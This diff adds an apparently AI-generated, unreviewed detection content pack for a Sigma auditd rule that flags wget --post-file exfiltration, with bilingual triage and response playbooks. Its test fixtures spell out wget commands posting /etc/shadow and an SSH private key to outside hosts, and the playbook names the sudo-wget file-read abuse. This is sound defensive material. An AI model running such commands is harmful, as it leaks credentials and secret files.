@@ -1,0 +1,133 @@
+{
+  "rule": {
+    "id": "cb39d16b-b3b6-4a7a-8222-1cf24b686ffc",
+    "title": "Data Exfiltration with Wget",
+    "level": "medium",
+    "status": "test",
+    "author": "Pawel Mazur",
+    "path": "linux/auditd/execve/lnx_auditd_data_exfil_wget.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/linux/auditd/execve/lnx_auditd_data_exfil_wget.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1048.003"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "auditd registró una ejecución de wget cuyo primer argumento es --post-file=, es decir, el envío del contenido de un archivo local a un servidor remoto mediante HTTP POST. Puede ser exfiltración de datos o lectura de archivos protegidos aprovechando un permiso sudo mal configurado.",
+      "what_it_detects": "Registros EXECVE de auditd con a0 igual a wget y a1 que empieza por --post-file=. La ruta del archivo enviado aparece en a1 y la URL de destino suele estar en a2 o en argumentos posteriores.",
+      "why_it_matters": "Corresponde a ATT&CK T1048.003 (exfiltración por un protocolo alternativo sin cifrar). Según GTFOBins, si wget se puede ejecutar con sudo, un usuario sin privilegios puede leer y enviar archivos como /etc/shadow o claves SSH a un servidor que controla.",
+      "triage_steps": [
+        "Revise a1 para identificar el archivo enviado; trate como crítico /etc/shadow, claves SSH, archivos .env, credenciales o respaldos de bases de datos.",
+        "Revise a2 y los argumentos siguientes para obtener la URL de destino; verifique si el dominio o la IP es interno, conocido o nunca visto.",
+        "Correlacione el ID del evento de audit con los registros SYSCALL y PROCTITLE para obtener auid, uid, euid, ppid y el comando completo; un euid 0 con un auid sin privilegios indica sudo.",
+        "Busque en auth.log o en el journal líneas sudo con COMMAND=/usr/bin/wget del mismo usuario y revise sudoers para ver si se permite ejecutar wget.",
+        "Identifique el proceso padre (ppid): una shell interactiva, un cron, un servidor web o un script de despliegue cambian la interpretación.",
+        "Revise el mismo host en +/- 15 minutos: otros EXECVE de wget o curl, lecturas de archivos sensibles, nuevas sesiones SSH y conexiones salientes hacia la misma IP.",
+        "Busque otros usos de wget con --post-file en argumentos posteriores a a1, porque la regla solo detecta esta opción en la primera posición."
+      ],
+      "false_positives": [
+        "Scripts legítimos que envían reportes, logs o resultados de pruebas a una API interna con wget --post-file.",
+        "Herramientas de monitoreo o inventario que suben archivos de estado a un servidor central.",
+        "Administradores que prueban endpoints HTTP enviando archivos de ejemplo durante tareas de soporte."
+      ],
+      "response_steps": [
+        "Confirme con el dueño del sistema o del usuario si el envío estaba autorizado y si el destino es legítimo.",
+        "Si no está autorizado, bloquee la IP o el dominio de destino en el proxy o firewall y aísle el host si hay más indicios de compromiso.",
+        "Si se envió un archivo de credenciales o secretos, rote las contraseñas, claves SSH y tokens afectados.",
+        "Elimine el permiso sudo para wget o restrinja la regla en sudoers, y revise otros binarios de GTFOBins permitidos.",
+        "Preserve los registros de auditd y de autenticación y amplíe la búsqueda a otros hosts con el mismo usuario o destino."
+      ],
+      "severity_rationale": "El nivel medio es adecuado porque wget --post-file tiene usos legítimos, pero se vuelve grave cuando el archivo es sensible, el destino es externo o se ejecuta con sudo."
+    },
+    "en": {
+      "summary": "auditd recorded a wget execution whose first argument is --post-file=, meaning a local file's contents were sent to a remote server via HTTP POST. This may be data exfiltration or abuse of a misconfigured sudo rule to read protected files.",
+      "what_it_detects": "auditd EXECVE records where a0 is wget and a1 starts with --post-file=. The file path being sent is in a1; the destination URL is usually in a2 or a later argument.",
+      "why_it_matters": "Maps to ATT&CK T1048.003, exfiltration over an unencrypted non-C2 protocol. As documented by GTFOBins, if wget is allowed via sudo, an unprivileged user can read and send files like /etc/shadow or SSH keys to a server they control.",
+      "triage_steps": [
+        "Check a1 for the file sent; treat /etc/shadow, SSH keys, .env files, credentials or database dumps as critical.",
+        "Check a2 and later arguments for the destination URL; determine whether the domain or IP is internal, known or never seen before.",
+        "Correlate the audit event ID with SYSCALL and PROCTITLE records to get auid, uid, euid, ppid and full command; euid 0 with an unprivileged auid suggests sudo.",
+        "Search auth.log or the journal for sudo lines with COMMAND=/usr/bin/wget from the same user and review sudoers for wget entries.",
+        "Identify the parent process (ppid): interactive shell, cron job, web server or deployment script each change the interpretation.",
+        "Review the same host within +/- 15 minutes: other wget or curl EXECVE events, sensitive file reads, new SSH sessions and outbound connections to the same IP.",
+        "Hunt for wget with --post-file in arguments after a1, since this rule only catches the option in the first position."
+      ],
+      "false_positives": [
+        "Legitimate scripts posting reports, logs or test results to an internal API with wget --post-file.",
+        "Monitoring or inventory tools uploading status files to a central server.",
+        "Administrators testing HTTP endpoints with sample files during support work."
+      ],
+      "response_steps": [
+        "Confirm with the system or user owner whether the upload was authorized and the destination is legitimate.",
+        "If unauthorized, block the destination IP or domain at the proxy or firewall and isolate the host if other compromise indicators exist.",
+        "If credential or secret files were sent, rotate the affected passwords, SSH keys and tokens.",
+        "Remove or tighten the sudo rule allowing wget and review other GTFOBins binaries permitted in sudoers.",
+        "Preserve auditd and authentication logs and widen the search to other hosts with the same user or destination."
+      ],
+      "severity_rationale": "Medium fits because wget --post-file has legitimate uses, but it becomes serious when the file is sensitive, the destination is external or it runs via sudo."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "wget run via sudo posting /etc/shadow to an external server",
+        "event": {
+          "type": "EXECVE",
+          "argc": 3,
+          "a0": "wget",
+          "a1": "--post-file=/etc/shadow",
+          "a2": "http://203.0.113.45:8080/upload",
+          "host": "bastion-01",
+          "msg": "audit(1635170592.311:4821)"
+        }
+      },
+      {
+        "description": "wget posting a user's SSH private key to a remote endpoint",
+        "event": {
+          "type": "EXECVE",
+          "argc": 4,
+          "a0": "wget",
+          "a1": "--post-file=/home/jperez/.ssh/id_rsa",
+          "a2": "-q",
+          "a3": "http://files.example.com/collect",
+          "host": "web-app-03",
+          "msg": "audit(1635171011.902:5177)"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "wget posting inline data with --post-data, not a file",
+        "event": {
+          "type": "EXECVE",
+          "argc": 3,
+          "a0": "wget",
+          "a1": "--post-data=status=ok",
+          "a2": "https://monitor.example.org/heartbeat",
+          "host": "web-app-03",
+          "msg": "audit(1635171500.120:5302)"
+        }
+      },
+      {
+        "description": "Normal wget download with no POST option",
+        "event": {
+          "type": "EXECVE",
+          "argc": 3,
+          "a0": "wget",
+          "a1": "-O",
+          "a2": "/tmp/package.tar.gz",
+          "host": "bastion-01",
+          "msg": "audit(1635172003.448:5410)"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-25T21:59:49+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
